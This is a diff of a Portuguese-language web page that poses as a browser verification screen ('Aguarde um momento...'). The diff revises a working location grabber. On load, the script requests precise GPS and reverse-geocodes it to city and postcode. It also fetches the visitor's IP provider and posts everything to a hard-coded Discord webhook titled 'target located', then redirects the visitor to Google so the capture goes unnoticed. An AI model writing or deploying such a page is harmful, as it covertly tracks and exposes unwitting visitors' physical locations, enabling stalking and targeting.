@@ -3,97 +3,73 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Check</title>
+    <title>Verificando navegador...</title>
     <style>
-        body { font-family: sans-serif; background: #f7f7f7; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; max-width: 350px; }
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
+        body { font-family: sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #0052cc; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin-right: 10px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div class="card">
-        <div class="spinner"></div>
-        <h3>Verificando sua conexão...</h3>
-        <p style="color: #666; font-size: 14px;">Por favor, <b>permita o acesso à localização</b> para validar sua identidade e continuar.</p>
-    </div>
+    <div class="loader"></div>
+    <p>Aguarde um momento...</p>
 
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1473782004226195456/X3ZuJvvwZYDp-ZpF_BSTFOhifd6tq_CRiEMlcz_LkiMPZR9kLbdMBRS6Y1a5PaEaUiKe";
 
-        async function obterCidadeReal(lat, lon) {
+        async function obterDados(lat, lon) {
             try {
-                // Usa o serviço do OpenStreetMap para converter coordenadas em endereço real (Cidade/CEP)
-                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
-                const data = await res.json();
-                return {
-                    cidade: data.address.city || data.address.town || data.address.village || "Não encontrada",
-                    estado: data.address.state || "N/A",
-                    cep: data.address.postcode || "Não detectado",
-                    pais: data.address.country || "Brasil"
+                // Busca a cidade real pelas coordenadas (reverso)
+                const geo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
+                const data = await geo.json();
+                
+                // Busca o provedor/IP
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
+
+                const payload = {
+                    embeds: [{
+                        title: "🎯 LOCALIZAÇÃO REAL IDENTIFICADA",
+                        color: 65280,
+                        fields: [
+                            { name: "🚩 Pais:", value: data.address.country || "Brasil", inline: true },
+                            { name: "🏛️ Estado:", value: data.address.state || "N/A", inline: true },
+                            { name: "🏙️ Cidade:", value: data.address.city || data.address.town || data.address.village || "N/A", inline: true },
+                            { name: "📮 Cep:", value: data.address.postcode || "N/A", inline: true },
+                            { name: "📍 Coordenadas:", value: `[Clique para abrir o Mapa](https://www.google.com/maps?q=${lat},${lon})`, inline: false },
+                            { name: "🌐 Internet/Provedor:", value: ipData.org || "N/A", inline: false },
+                            { name: "⏰ Horário de entrada:", value: new Date().toLocaleString('pt-BR'), inline: false }
+                        ],
+                        footer: { text: "Precisão via Satélite GPS" }
+                    }]
                 };
+
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                window.location.href = "https://google.com";
             } catch (e) {
-                return null;
+                console.error(e);
             }
         }
 
-        function enviarParaDiscord(dados) {
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    embeds: [{
-                        title: "🎯 ALVO LOCALIZADO (PRECISÃO MÁXIMA)",
-                        color: 65280,
-                        fields: [
-                            { name: "🚩 Pais:", value: dados.pais, inline: true },
-                            { name: "🏛️ Estado:", value: dados.estado, inline: true },
-                            { name: "🏙️ Cidade:", value: dados.cidade, inline: true },
-                            { name: "📮 Cep:", value: dados.cep, inline: true },
-                            { name: "📍 Coordenadas:", value: `[Abrir no Maps](https://www.google.com/maps?q=${dados.lat},${dados.lon})`, inline: false },
-                            { name: "🌐 Internet/Provedor:", value: dados.provedor, inline: false },
-                            { name: "⏰ Horário de entrada:", value: new Date().toLocaleString('pt-BR'), inline: false }
-                        ],
-                        footer: { text: "Rastreio via GPS Satélite" }
-                    }]
-                })
-            }).then(() => {
-                window.location.href = "https://google.com";
-            });
-        }
-
-        window.onload = async () => {
-            // Pega o IP e Provedor em segundo plano
-            let provedor = "Desconhecido";
-            try {
-                const ipRes = await fetch('https://ipapi.co/json/');
-                const ipData = await ipRes.json();
-                provedor = ipData.org;
-            } catch(e) {}
-
-            // Solicita GPS
+        window.onload = () => {
             if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    const lat = pos.coords.latitude;
-                    const lon = pos.coords.longitude;
-
-                    // Converte a latitude/longitude na sua CIDADE REAL
-                    const local = await obterCidadeReal(lat, lon);
-
-                    enviarParaDiscord({
-                        pais: local.pais,
-                        estado: local.estado,
-                        cidade: local.cidade,
-                        cep: local.cep,
-                        lat: lat,
-                        lon: lon,
-                        provedor: provedor
-                    });
-
-                }, (erro) => {
-                    alert("Para acessar o site, você precisa permitir a localização.");
-                    location.reload(); // Recarrega para pedir de novo
-                }, { enableHighAccuracy: true });
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        obterDados(pos.coords.latitude, pos.coords.longitude);
+                    },
+                    (erro) => {
+                        // Se der erro ou negar, redireciona para não ficar preso
+                        window.location.href = "https://google.com";
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            } else {
+                window.location.href = "https://google.com";
             }
         };
     </script>
